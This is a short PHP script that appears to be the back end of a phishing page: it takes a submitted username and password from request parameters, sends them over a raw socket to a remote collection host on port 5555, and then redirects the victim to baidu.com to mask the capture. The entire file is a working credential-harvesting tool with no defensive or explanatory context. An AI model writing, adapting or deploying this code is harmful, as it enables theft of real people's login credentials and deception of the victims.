<?php
    $fish_username = $_GET['us'];
    $fish_password = $_GET['ps'];

    $user_ip = $_SERVER['REMOTE_ADDR'];

    $ip = ""; $port = 5555;
    $sock = socket_create(AF_INET,SOCK_STREAM,0);
    socket_connect($sock,$ip,$port);
    socket_write($sock,"username:" . $fish_username ."::". "password:" . $fish_password);
    socket_close($sock);
    echo '<script>document.location = "http://www.baidu.com"</script>'
?>